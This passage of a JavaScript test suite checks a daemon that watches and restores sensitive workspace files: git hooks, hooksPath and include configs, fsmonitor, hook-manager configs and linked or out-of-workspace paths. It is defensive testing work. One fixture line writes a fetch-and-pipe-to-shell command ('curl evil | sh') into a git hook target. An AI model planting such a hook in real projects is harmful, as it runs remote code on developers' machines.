  // refused: not a watched file, a folder, through a linked folder
  fs.mkdirSync(path.join(ROOT, 'outside', 'dotclaude'));
  fs.symlinkSync(path.join(ROOT, 'outside', 'dotclaude'), path.join(WS, '.claude'));
  for (const bad of [{ path: 'src/other.txt' }, { path: '../outside/secret.txt' }, { path: '.git/hooks' }, { path: '.git/hooks/x.sample' },
    { path: '.claude/settings.json', data: Buffer.from('{}').toString('base64') }, { path: '.envrc', ifSha256: null, data: '!!' }]) {
    assert.ok(result(await talk(SOCK, [open({ op: 'ws.restore', ...bad })])).error, JSON.stringify(bad));
  }
  assert.equal(fs.readdirSync(path.join(ROOT, 'outside', 'dotclaude')).length, 0, 'nothing written through the linked folder');
  assert.equal(result(await talk(SOCK, [open({ op: 'ws.sensitive' })])).files.some((f) => f.path.startsWith('.claude/')), false, 'nor read through it');
  fs.rmSync(path.join(WS, '.claude'));
});


test('the watchlist follows git: core.hooksPath, include.path, core.fsmonitor in the workspace, a gitdir file, submodules, hook managers, linked hooks', async () => {
  const W2 = path.join(ROOT, 'ws2-src');   // (the workspace of this test: the same one, reset)
  const w = (p, t, mode = 0o644) => { fs.mkdirSync(path.dirname(path.join(WS, p)), { recursive: true }); fs.writeFileSync(path.join(WS, p), t, { mode }); };
  for (const n of fs.readdirSync(WS)) fs.rmSync(path.join(WS, n), { recursive: true, force: true });
  // (the include first: its hooksPath is overridden by the config's own, later one — git uses the last)
  w('.git/config', '[include]\n\tpath = ../gitinc.cfg\n[core]\n\thooksPath = .githooks\n\tfsmonitor = tools/fsmon.sh\n[includeIf "gitdir:/x/"]\n\tpath = /etc/outside.cfg\n');
  w('gitinc.cfg', '[core]\n\thooksPath = .husky/_\n\tfsmonitor = tools/old.sh\n');
  w('.githooks/pre-commit', 'npm test\n', 0o755);
  w('.husky/_/h', '#!/bin/sh\n');
  w('tools/fsmon.sh', 'echo fsmon\n');
  w('.git/modules/sub/config', '[core]\n');
  w('.git/modules/sub/hooks/post-checkout', 'x\n');
  for (const f of ['.pre-commit-config.yaml', 'lefthook.yml', '.lintstagedrc.json', '.yarnrc.yml', '.npmrc', '.pnpmfile.cjs', 'proj.code-workspace',
    '.devcontainer/py/devcontainer.json', 'Makefile', 'pyproject.toml', '.nvmrc', '.env']) w(f, 'x\n');
  w('hooks-src/pre-push', 'echo linked\n');
  fs.mkdirSync(path.join(WS, '.git/hooks'), { recursive: true });
  fs.symlinkSync(path.join(WS, 'hooks-src/pre-push'), path.join(WS, '.git/hooks/pre-push'));
  let r = result(await talk(SOCK, [open({ op: 'ws.sensitive' })]));
  const by = Object.fromEntries(r.files.map((f) => [f.path, f]));
  for (const p of ['.githooks/pre-commit', 'gitinc.cfg', 'tools/fsmon.sh', '.git/modules/sub/config', '.git/modules/sub/hooks/post-checkout',
    '.pre-commit-config.yaml', 'lefthook.yml', '.lintstagedrc.json', '.yarnrc.yml', '.npmrc', '.pnpmfile.cjs', 'proj.code-workspace',
    '.devcontainer/py/devcontainer.json', '.git/hooks/pre-push']) assert.ok(by[p], p);
  for (const p of ['Makefile', 'pyproject.toml', '.nvmrc', '.env', 'hooks-src/pre-push', '.husky/_/h', 'tools/old.sh']) assert.equal(by[p], undefined, p);
  assert.equal(r.truncated, undefined);
  // the hook folders come first (what runs at every commit), the submodules last
  const order = r.files.map((f) => f.path);
  assert.ok(order.indexOf('.githooks/pre-commit') < order.indexOf('.git/config') && order.indexOf('.git/config') < order.indexOf('.git/modules/sub/hooks/post-checkout'), order.join(' '));
  assert.equal(Object.keys(by).some((p) => p.includes('outside') || p.startsWith('/') || p.includes('..')), false, 'nothing outside the workspace');
  assert.deepEqual([by['.githooks/pre-commit'].kind, by['gitinc.cfg'].kind, by['tools/fsmon.sh'].kind], ['git-hook', 'git-config', 'fsmonitor']);
  // a linked hook: what it points to (in the workspace) counts
  const before = by['.git/hooks/pre-push'].sha256;
  w('hooks-src/pre-push', 'curl evil | sh\n');
  r = result(await talk(SOCK, [open({ op: 'ws.sensitive' })]));
  assert.notEqual(r.files.find((f) => f.path === '.git/hooks/pre-push').sha256, before, 'a changed link target changes the hook\'s hash');
  // a hooksPath hook can be put back (a new one goes to the trash); "." and ".." never pass
  const pc = r.files.find((f) => f.path === '.githooks/pre-commit');
  let x = result(await talk(SOCK, [open({ op: 'ws.restore', path: '.githooks/pre-commit', ifSha256: pc.sha256, data: null })]));
  assert.equal(x.action, 'trashed');
  for (const bad of ['.githooks/../package.json', './.envrc', '.git/hooks/.', 'hooks-src/pre-push']) {
    assert.ok(result(await talk(SOCK, [open({ op: 'ws.restore', path: bad, ifSha256: null, data: null })])).error, bad);
  }
  assert.equal(coded.watchRel('a/../b'), false); assert.equal(coded.watchRel('./a'), false); assert.equal(coded.watchRel('a'), true);
  // a .git file (a worktree or submodule checkout): reported, and its gitdir followed when it is in the workspace
  fs.rmSync(path.join(WS, '.git'), { recursive: true, force: true });
  w('.git', 'gitdir: other/.gitdir\n');
  w('other/.gitdir/config', '[core]\n');
  w('other/.gitdir/hooks/pre-commit', 'x\n');
  r = result(await talk(SOCK, [open({ op: 'ws.sensitive' })]));
  const g = Object.fromEntries(r.files.map((f) => [f.path, f]));
  assert.equal(g['.git'].type, 'file');
  assert.ok(g['other/.gitdir/config'] && g['other/.gitdir/hooks/pre-commit'], Object.keys(g).join(' '));
  w('.git', 'gitdir: /somewhere/else\n');
  r = result(await talk(SOCK, [open({ op: 'ws.sensitive' })]));
  assert.equal(r.files.some((f) => f.path.startsWith('other/')), false, 'a gitdir outside: only the .git file itself');
  void W2;
});

test('the watchlist: the last core.hooksPath only; includes capped (truncated, never a silent cut); hooks listed before many configs', async () => {
  const w = (p, t, mode = 0o644) => { fs.mkdirSync(path.dirname(path.join(WS, p)), { recursive: true }); fs.writeFileSync(path.join(WS, p), t, { mode }); };
  for (const n of fs.readdirSync(WS)) fs.rmSync(path.join(WS, n), { recursive: true, force: true });
  // 320 includes, each naming a hooks folder of its own (as a PoC would), the real hooksPath last
  const inc = [];
  for (let i = 0; i < 320; i++) { w(`inc/c${i}.cfg`, `[core]\n\thooksPath = hooks${i}\n`); w(`hooks${i}/pre-commit`, 'x\n'); inc.push(`[include]\n\tpath = ../inc/c${i}.cfg\n`); }
  w('.git/config', `${inc.join('')}[core]\n\thooksPath = .githooks\n`);
  w('.githooks/pre-commit', 'echo real\n', 0o755);
  const t0 = Date.now();
  let r = result(await talk(SOCK, [open({ op: 'ws.sensitive' })]));
  assert.ok(Date.now() - t0 < 2000, `${Date.now() - t0} ms`);
  assert.equal(r.truncated, true, 'more includes than followed: said');
  assert.ok(r.files.length <= 256, String(r.files.length));
  const paths = r.files.map((f) => f.path);
  assert.ok(paths.includes('.githooks/pre-commit'), 'the hooks git uses are there');
  assert.equal(paths.filter((p) => /^hooks\d+\//.test(p)).length, 0, 'only the last hooksPath');
  assert.equal(paths.filter((p) => p.startsWith('inc/')).length, 16, 'at most 16 includes');
  assert.ok(paths.indexOf('.githooks/pre-commit') < paths.indexOf('.git/config'));
  // a quoted value keeps its # and ;, an unquoted one ends at them; config.worktree with extensions.worktreeConfig
  for (const n of fs.readdirSync(WS)) fs.rmSync(path.join(WS, n), { recursive: true, force: true });
  w('.git/config', '[extensions]\n\tworktreeConfig = true\n[include]\n\tpath = "evil#x.cfg" ; a comment\n[core]\n\tfsmonitor = tools/m.sh # comment\n');
  w('.git/evil#x.cfg', '[core]\n');
  w('.git/config.worktree', '[core]\n\thooksPath = wt-hooks\n');
  w('wt-hooks/pre-push', 'x\n');
  w('tools/m.sh', 'x\n');
  r = result(await talk(SOCK, [open({ op: 'ws.sensitive' })]));
  const by = Object.fromEntries(r.files.map((f) => [f.path, f]));
  for (const p of ['.git/evil#x.cfg', '.git/config.worktree', 'wt-hooks/pre-push', 'tools/m.sh']) assert.ok(by[p], `${p}: ${Object.keys(by).join(' ')}`);
  assert.equal(by['.git/config.worktree'].kind, 'git-config');
  assert.deepEqual(coded.gitConfigLines('[a]\n\tk = "x;y" # c\n\tflag\n\te = a\\"b\n').map((l) => [l.section, l.key, l.value]),
    [['a', 'k', 'x;y'], ['a', 'flag', 'true'], ['a', 'e', 'a"b']]);
  // a hook folder of more than 64 files: truncated too
  for (const n of fs.readdirSync(WS)) fs.rmSync(path.join(WS, n), { recursive: true, force: true });
  for (let i = 0; i < 70; i++) w(`.git/hooks/h${String(i).padStart(2, '0')}`, 'x\n');
  r = result(await talk(SOCK, [open({ op: 'ws.sensitive' })]));
  assert.equal(r.truncated, true);
  // a link to a FIFO (swapped in for a hook's target) is hashed without blocking
  for (const n of fs.readdirSync(WS)) fs.rmSync(path.join(WS, n), { recursive: true, force: true });
  fs.mkdirSync(path.join(WS, '.git/hooks'), { recursive: true });
  execFileSync('mkfifo', [path.join(WS, 'fifo')]);
  fs.symlinkSync(path.join(WS, 'fifo'), path.join(WS, '.git/hooks/pre-commit'));
  r = result(await talk(SOCK, [open({ op: 'ws.sensitive' })]));
  assert.equal(r.files.find((f) => f.path === '.git/hooks/pre-commit')?.type, 'symlink');
});
